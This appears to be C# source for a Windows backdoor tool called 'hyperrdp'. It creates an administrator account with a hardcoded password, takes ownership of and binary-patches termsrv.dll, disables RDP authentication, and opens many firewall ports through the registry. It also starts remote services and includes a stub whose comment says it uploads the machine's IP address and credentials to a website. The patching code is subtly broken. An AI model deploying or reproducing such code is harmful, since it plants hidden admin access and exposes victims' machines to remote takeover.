using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace hyperrdp
{
    class Program
    {
        static byte[][] patterns = new byte[][] {
            new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0xB1, 0x7D, 0x02, 0x00 },
            new byte[] { 0x8B, 0x99, 0x3C, 0x06, 0x00, 0x00, 0x8B, 0xB9, 0x38, 0x06, 0x00, 0x00 },
            new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x3B, 0x2B, 0x01, 0x00 },
            new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x5D, 0x61, 0x01, 0x00 },
            new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x5D, 0x61, 0x01, 0x00 }
        };

        static byte[] replacement = new byte[] { 0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81, 0x38, 0x06, 0x00, 0x00, 0x90 };

        static void Main(string[] args)
        {
            // create a new user so we know user/pass
            if (!UserExists("remotedesktop"))
                CreateWindowsUser("remotedesktop", "remotedesktop");

            try
            {
                // stop service to make changess
                StopService("TermService", 10000);

                Thread.Sleep(1000);

                // allow multiple connections
                AllowMultipleConnections();

                // change user policies
                EditRPCPolicy();

                // enable firewall rules in registry
                EnableFirewallRules();

                // bypass firewall
                BypassFirewall("Remote Desktop");
                BypassFirewall("Remote Assistance");
                BypassFirewall("Remote Administration");

                // enable registry settings
                EnableRegistrySettings();

                // start services
                StartService("TermService", 10000);
                StartService("SessionEnv", 10000);
                StartService("RasMan", 10000);
                StartService("UmRdpService", 10000);
                StartService("RemoteRegistry", 10000);
                StartService("RasAuto", 10000);

                // upload IP-Address and credentials to website
                UploadCredentials();

            }
            catch
            {
                 throw;
            }

            // need to port forward 3389-3389


        }

        private static bool UserExists(string username)
        {

            using (PrincipalContext pc = new PrincipalContext(ContextType.Machine))
            {
                UserPrincipal up = UserPrincipal.FindByIdentity(
                    pc,
                    IdentityType.SamAccountName,
                   username);

                bool UserExists = (up != null);

                return UserExists;
            }
        }

        private static void OwnthatFile(string filename)
        {
            // Way safer than string comparison against "BUILTIN\\Administrators"
            IdentityReference BuiltinAdministrators = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);

            // Grab ACL from file
            FileSecurity FileACL = File.GetAccessControl(filename);

            // Check if correct owner is set
            if (FileACL.GetOwner(typeof(SecurityIdentifier)) != BuiltinAdministrators)
            {
                // If not, make it so!
                FileACL.SetOwner(BuiltinAdministrators);
            }

            foreach (FileSystemAccessRule fsRule in FileACL.GetAccessRules(true, false, typeof(SecurityIdentifier)))
            {
                // Check if rule grants delete
                if ((fsRule.FileSystemRights & FileSystemRights.Write) == FileSystemRights.Write)
                {
                    // If so, nuke it!
                    FileACL.RemoveAccessRule(fsRule);
                }
            }

            // Add a single explicit rule to allow FullControl
            FileACL.AddAccessRule(new FileSystemAccessRule(BuiltinAdministrators, FileSystemRights.FullControl, AccessControlType.Allow));

            // Enable protection from inheritance, remove existing inherited rules
            FileACL.SetAccessRuleProtection(true, false);



            // Write ACL back to file
            File.SetAccessControl(filename, FileACL);
        }

        private static void AllowMultipleConnections()
        {//icacls c:\Windows\System32\termsrv.dll /grant Administrators:F



            // this part is windows 10 version specific
            if (!File.Exists("C:\\windows\\system32\\termsrv.dll.bak"))
            {
                File.Copy("C:\\windows\\system32\\termsrv.dll", "C:\\windows\\system32\\termsrv.dll.bak");

                using (Process p = new Process())
                {
                    p.StartInfo.FileName = "cmd";
                    p.StartInfo.Arguments = "/C \"takeown /F c:\\Windows\\System32\\termsrv.dll /A\"";
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.Verb = "runas";
                    p.Start();
                    p.WaitForExit();
                }

                using (Process p = new Process())
                {
                    p.StartInfo.FileName = "cmd";
                    p.StartInfo.Arguments = "/C \"icacls c:\\Windows\\System32\\termsrv.dll /grant Administrators:F\"";
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.Verb = "runas";
                    p.Start();
                    p.WaitForExit();

                }

                OwnthatFile("c:\\Windows\\System32\\termsrv.dll");

                byte[] data = File.ReadAllBytes("C:\\windows\\system32\\termsrv.dll");
                foreach (var pattern in patterns)
                {
                    int[] indexes = Locate(data, pattern);
                    if (indexes != null)
                        for (int index = 0; index < indexes.Count(); index++)
                        {
                            for (int i = 0; i < pattern.Length; i++)
                            {
                                data[index + i] = pattern[i];
                            }
                        }
                }
                File.WriteAllBytes("C:\\windows\\system32\\termsrv.dll", data);

            }
        }

        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
        {
            for (int i = 0; i < source.Length; i++)
            {
                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
                {
                    yield return i;
                }
            }
        }


        public static int[] Locate(byte[] self, byte[] candidate)
        {
            if (IsEmptyLocate(self, candidate))
                return null;

            var list = new List<int>();

            for (int i = 0; i < self.Length; i++)
            {
                if (!IsMatch(self, i, candidate))
                    continue;

                list.Add(i);
            }

            return list.Count == 0 ? null : list.ToArray();
        }

        static bool IsMatch(byte[] array, int position, byte[] candidate)
        {
            if (candidate.Length > (array.Length - position))
                return false;

            for (int i = 0; i < candidate.Length; i++)
                if (array[position + i] != candidate[i])
                    return false;

            return true;
        }

        static bool IsEmptyLocate(byte[] array, byte[] candidate)
        {
            return array == null
                || candidate == null
                || array.Length == 0
                || candidate.Length == 0
                || candidate.Length > array.Length;
        }

        private static void UploadCredentials()
        {

        }

        private static void EditRPCPolicy()
        {
            foreach (string subKey in Registry.Users.GetSubKeyNames())
            {
                try
                {
                    using (RegistryKey key = Registry.Users.OpenSubKey(string.Format("{0}\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects", subKey)))
                    {
                        foreach (string secondSubKey in key.GetSubKeyNames())
                        {
                            using (RegistryKey secondKey = Registry.Users.CreateSubKey(string.Format("{0}\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy Objects\\{1}\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services", subKey, secondSubKey), RegistryKeyPermissionCheck.ReadWriteSubTree))
                            {
                                secondKey.SetValue("UserAuthentication", 0);
                                secondKey.SetValue("MaxInstanceCount", 999999);
                            }
                        }
                    }
                }
                catch
                {
                    continue;
                }

            }
        }


        public static void StartService(string serviceName, int timeoutMilliseconds)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);

                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, timeout);
            }
            catch
            {
                // ...
            }
        }

        public static void StopService(string serviceName, int timeoutMilliseconds)
        {
            ServiceController service = new ServiceController(serviceName);
            try
            {
                TimeSpan timeout = TimeSpan.FromMilliseconds(timeoutMilliseconds);

                service.Stop();
                service.WaitForStatus(ServiceControllerStatus.Stopped, timeout);
            }
            catch
            {
                // ...
            }
        }



        private static void EnableRegistrySettings()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true))
            {
                key.SetValue("AllowRemoteRPC", 1);
                key.SetValue("fSingleSessionPerUser", 0);
                key.SetValue("fDenyChildConnections", 0);
                key.SetValue("fDenyTSConnections", 0);
                key.SetValue("StartRCM", 1);
                key.SetValue("TSUserEnabled", 1);

                key.Flush();
            }

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Remote Assistance", true))
            {
                key.SetValue("fAllowToGetHelp", 1);
                key.Flush();

            }

            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true))
            {
                key.SetValue("UserAuthentication", 0);
                key.Flush();
            }


        }

        private static void EnableFirewallRules()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules", true))
            {
                key.SetValue("RemoteDesktop-UserMode-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=3389|App=%SystemRoot%\\system32\\svchost.exe|Svc=termservice|Name=Remote Desktop - User Mode (TCP-In)|Desc=@FirewallAPI.dll,-28756|EmbedCtxt=@FirewallAPI.dll,-28752|");

                key.SetValue("RemoteFwAdmin-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\svchost.exe|Svc=policyagent|Name=@FirewallAPI.dll,-30003|Desc=@FirewallAPI.dll,-30006|EmbedCtxt=@FirewallAPI.dll,-30002|");
                key.SetValue("RemoteFwAdmin-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=RPC|App=%SystemRoot%\\system32\\svchost.exe|Svc=policyagent|Name=@FirewallAPI.dll,-30003|Desc=@FirewallAPI.dll,-30006|EmbedCtxt=@FirewallAPI.dll,-30002|");
                key.SetValue("RemoteFwAdmin-RPCSS-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC-EPMap|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-30007|Desc=@FirewallAPI.dll,-30010|EmbedCtxt=@FirewallAPI.dll,-30002|");
                key.SetValue("RemoteFwAdmin-RPCSS-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=RPC-EPMap|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-30007|Desc=@FirewallAPI.dll,-30010|EmbedCtxt=@FirewallAPI.dll,-30002|");

                key.SetValue("RemoteSvcAdmin-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\services.exe|Name=@FirewallAPI.dll,-29503|Desc=@FirewallAPI.dll,-29506|EmbedCtxt=@FirewallAPI.dll,-29502|");
                key.SetValue("RemoteSvcAdmin-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=RPC|App=%SystemRoot%\\system32\\services.exe|Name=@FirewallAPI.dll,-29503|Desc=@FirewallAPI.dll,-29506|EmbedCtxt=@FirewallAPI.dll,-29502|");
                key.SetValue("RemoteSvcAdmin-NP-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=445|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-29507|Desc=@FirewallAPI.dll,-29510|EmbedCtxt=@FirewallAPI.dll,-29502|");
                key.SetValue("RemoteSvcAdmin-NP-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=445|App=System|Name=@FirewallAPI.dll,-29507|Desc=@FirewallAPI.dll,-29510|EmbedCtxt=@FirewallAPI.dll,-29502|");
                key.SetValue("RemoteSvcAdmin-RPCSS-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC-EPMap|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-29515|Desc=@FirewallAPI.dll,-29518|EmbedCtxt=@FirewallAPI.dll,-29502|");
                key.SetValue("RemoteSvcAdmin-RPCSS-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=RPC-EPMap|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-29515|Desc=@FirewallAPI.dll,-29518|EmbedCtxt=@FirewallAPI.dll,-29502|");

                key.SetValue("RemoteTask-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\svchost.exe|Svc=schedule|Name=@FirewallAPI.dll,-33253|Desc=@FirewallAPI.dll,-33256|EmbedCtxt=@FirewallAPI.dll,-33252|");
                key.SetValue("RemoteTask-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=RPC|App=%SystemRoot%\\system32\\svchost.exe|Svc=schedule|Name=@FirewallAPI.dll,-33253|Desc=@FirewallAPI.dll,-33256|EmbedCtxt=@FirewallAPI.dll,-33252|");
                key.SetValue("RemoteTask-RPCSS-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC-EPMap|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-33257|Desc=@FirewallAPI.dll,-33260|EmbedCtxt=@FirewallAPI.dll,-33252|");
                key.SetValue("RemoteTask-RPCSS-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|Profile=Private|LPort=RPC-EPMap|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-33257|Desc=@FirewallAPI.dll,-33260|EmbedCtxt=@FirewallAPI.dll,-33252|");

                key.SetValue("RemoteAdmin-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\svchost.exe|Svc=*|Name=@FirewallAPI.dll,-29753|Desc=@FirewallAPI.dll,-29756|EmbedCtxt=@FirewallAPI.dll,-29752|");
                key.SetValue("RemoteAdmin-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC|App=%SystemRoot%\\system32\\svchost.exe|Svc=*|Name=@FirewallAPI.dll,-29753|Desc=@FirewallAPI.dll,-29756|EmbedCtxt=@FirewallAPI.dll,-29752|");
                key.SetValue("RemoteAdmin-NP-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=445|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-29757|Desc=@FirewallAPI.dll,-29760|EmbedCtxt=@FirewallAPI.dll,-29752|");
                key.SetValue("RemoteAdmin-NP-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=445|App=System|Name=@FirewallAPI.dll,-29757|Desc=@FirewallAPI.dll,-29760|EmbedCtxt=@FirewallAPI.dll,-29752|");
                key.SetValue("RemoteAdmin-RPCSS-In-TCP", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC-EPMap|RA4=LocalSubnet|RA6=LocalSubnet|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-29765|Desc=@FirewallAPI.dll,-29768|EmbedCtxt=@FirewallAPI.dll,-29752|");
                key.SetValue("RemoteAdmin-RPCSS-In-TCP-NoScope", "v2.27|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Private|Profile=Public|LPort=RPC-EPMap|App=%SystemRoot%\\system32\\svchost.exe|Svc=RPCSS|Name=@FirewallAPI.dll,-29765|Desc=@FirewallAPI.dll,-29768|EmbedCtxt=@FirewallAPI.dll,-29752|");
            }
        }

        private static void BypassFirewall(string appName)
        {
            SecureString pw = new SecureString();
            pw.AppendChar('r');
            pw.AppendChar('e');
            pw.AppendChar('m');
            pw.AppendChar('o');
            pw.AppendChar('t');
            pw.AppendChar('e');
            pw.AppendChar('d');
            pw.AppendChar('e');
            pw.AppendChar('s');
            pw.AppendChar('k');
            pw.AppendChar('t');
            pw.AppendChar('o');
            pw.AppendChar('p');
            pw.MakeReadOnly();

            try
            {

         
            using (Process p = new Process())
            {
                p.StartInfo.FileName = "powershell.exe";
                p.StartInfo.Arguments = string.Format("-command \"Enable-NetFirewallRule -DisplayGroup '{0}'\"", appName);
                p.StartInfo.Verb = "runas";
                p.StartInfo.UserName = "remotedesktop";
                p.StartInfo.Password = pw;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                p.WaitForExit();
            }
            } catch { }
        }

        public static void CreateWindowsUser(string Name, string Pass)
        {


            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" +
                                    Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(Name, "user");
                NewUser.Invoke("SetPassword", new object[] { Pass });
                NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);

            }

        }
    }
}
